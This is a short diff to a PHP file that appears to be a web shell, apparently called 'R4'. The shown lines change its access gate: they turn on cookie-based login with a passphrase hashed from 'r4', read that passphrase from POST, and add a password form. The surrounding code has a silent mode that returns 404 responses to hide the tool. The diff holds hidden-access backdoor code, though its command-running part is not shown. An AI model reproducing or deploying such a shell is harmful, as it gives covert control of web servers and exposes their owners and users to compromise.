@@ -22,8 +22,8 @@
 
 define('R4_DEBUG', true); // show post data
 define('R4_SILENT_MODE', true); // 404 response code
-define('R4_LOGIN_MODE', false); // cookie based authentication (Vulnerable)
-define('R4_PASSPHARSE', '74d6d852df92296653bd64746e6c34d20e85e86e'); // sha1
+define('R4_LOGIN_MODE', true); // cookie based authentication (Vulnerable)
+define('R4_PASSPHARSE', '7e264138d0ca103b872057862b9b0359962ec5d2'); // sha1(r4)
 /** Alternative Functions */
 if(!function_exists('hex2bin')) {
     function hex2bin($hexdec)
@@ -267,11 +267,20 @@ function activateLoginSystem()
 }
 function authLogin()
 {
-    if (isset($_REQUEST['id'])) {
-        if (sha1($_REQUEST['id']) === R4_PASSPHARSE) {
+    if (isset($_POST['id'])) {
+        if (sha1($_POST['id']) === R4_PASSPHARSE) {
             setcookie('r4', R4_PASSPHARSE);
         }
+        chdir(getcwd());
     }
+    ?>
+    <form method="post" id="form_login">
+        <div class="row">
+            <input type="password" name="id" value="">
+            <input type="submit" name="submit" value="<<<<">
+        </div>
+    </form>
+    <?php
     die;
 }
 /**
